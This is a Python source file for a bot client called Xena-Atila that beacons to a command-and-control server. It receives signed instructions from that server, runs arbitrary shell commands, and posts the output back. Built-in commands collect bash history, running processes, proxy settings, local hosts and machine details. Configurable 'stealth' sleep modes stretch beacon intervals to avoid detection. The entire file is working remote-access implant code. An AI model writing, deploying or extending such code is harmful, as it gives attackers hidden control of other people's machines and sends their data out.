import json
import logging
import jwcrypto.jwk as jwk
import jwcrypto.jwt as jwt

from env import XENA_ATILA_HOST, TRUSTED_PUBLIC_KEY, STEALTH
from time import sleep
from requests import post, get
from uuid import uuid4
from typing import Union
from Crypto.PublicKey import RSA
from random import randint
from services.system import System
from domains.message import Message

# Unique identifier of this bot instance.
client_id = str(uuid4())
private_key_raw = RSA.generate(4096)
private_key = private_key_raw.export_key('PEM', pkcs=8).decode('utf-8')
public_key = private_key_raw.publickey().export_key().decode('utf-8')

class XenaAtila:
  def __init__(self):
    logging.debug('Unique identifier at ' + client_id)

    self.remote = XENA_ATILA_HOST

    # Identify to the Atila.
    while True:
      try:
        if self.identify(self.remote) == True:
          break
      except Exception as e:
        logging.debug('Unable to identify for ' + self.remote + ' with the error:' + str(e))
      self.sleep()
    
    logging.debug('Xena-Atila has been successfuly recognized by ' + self.remote)

    # Fetch message loop.
    while True:
      messages = self.read_inbox(self.remote)
      print(messages)
      self.sleep()

  def read_inbox(self, remote_host: str) -> Union[Message, None]:
    try:
      messages_response = get(remote_host + '/v1/messages?clientId=' + client_id + '&status=SENT')
    except Exception as e:
      logging.warning('Unable to reach the remote in order to read the inbox. ' + str(e))
      return

    # No messages for the client.
    if (messages_response.status_code != 200):
      return None

    maybe_messages = json.loads(messages_response.content.decode('utf-8'))

    # Loop over each messages.
    for maybe_message in maybe_messages:
      message = Message.from_json(maybe_message)
      subject = message.subject

      # Verify and decode the message.
      try:
        receivedToken = jwt.JWT(key = jwk.JWK.from_pem(TRUSTED_PUBLIC_KEY), jwt = message.content)
        content = json.loads(receivedToken.claims)
      except Exception as e:
        logging.warning('Unable to verify the token.' + str(e))
        continue
      
      if subject != 'instruction':
        return

      output = self.execute_instruction(content['shell'])

      # Sign the response.
      token = jwt.JWT(
        header = { 'alg': 'RS512' },
        claims = output,
      )
      token.make_signed_token(jwk.JWK.from_pem(private_key.encode()))

      # Send the message reply.
      message_insertion = post(self.remote + "/v1/messages", data = {
        'from': client_id,
        'to': None,
        'subject': 'shell-output',
        'content': token.serialize(),
        'replyTo': message.id,
      })

      # Failed to insert the message reply.
      if (message_insertion.status_code != 200):
        logging.debug('Failed to insert a message reply.')
        continue
      
      # Ack. the message.
      message_ack = post(self.remote + '/v1/messages/ack', data = {
        'id': message.id,
      })

      # Failed to ack. the message.
      if (message_ack.status_code != 200):
        logging.warn('Message ACK failure has occured, but it is not handled!')
        logging.debug(message_ack.json())

  # Make yourself known to the remote host.
  def identify(self, remote_host: str) -> bool:
    response = post(remote_host + '/v1/clients', data = {
      'id': client_id,
      'publicKey': public_key,
      'status': 'ALIVE',
    })

    # The request has failed. If 409 is returned, means that we're already recognized peer.
    if response.status_code != 200 and response.status_code != 409:
      logging.debug('Identification failed with ' + str(response.status_code) + ' status code for ' + remote_host)
      logging.debug(response.json())
      return False
    
    return True
  
  def execute_instruction(self, shell: str):
    output = str

    if shell is None:
      return 'INVALID_COMMAND'
    
    # COMMAND: SHELL
    if shell[0] != '/':
      output = System.do(shell)
    
    # COMMAND: GET_BASH_HISTORY
    if shell == '/get processes':
      processes = ''
      for ps in System.enumerate_running_processes():
        processes += 'name: ' + ps['name'] + ', pid: ' + str(ps['pid']) + ', cpu_percent: ' + str(ps['cpu_percent'])  + '\n'
      output = processes

    # COMMAND: GET_BASH_HISTORY
    if shell == '/get bash history':
      output = System.get_bash_history_cat()

    # COMMAND: GET_PROXY_SETTINGS
    if shell == '/get proxy settings':
      output = json.dumps(System.system_proxy_settings())

    # COMMAND: GET_LOCALHOST
    if shell == '/get localhost':
      output = System.enumerate_local_host()

    # COMMAND: GET_MACHINE_DETAILS
    if shell == '/get machine details':
      output = json.dumps(System.environment_details())
    
    return str(output)
  
  def sleep(self):
    amount = 0
    if STEALTH == 'AGGRESIVE':
      amount = 10
    if STEALTH == 'PUSHY':
      amount = randint(600, 1000)
    if STEALTH == 'NORMAL':
      amount = randint(3600, 7200)
    if STEALTH == 'SNEAKY':
      amount = randint(7200, 28800)
    if STEALTH == 'PARANOID':
      amount = randint(28800, 129600)
    sleep(amount)


xena_atila = XenaAtila()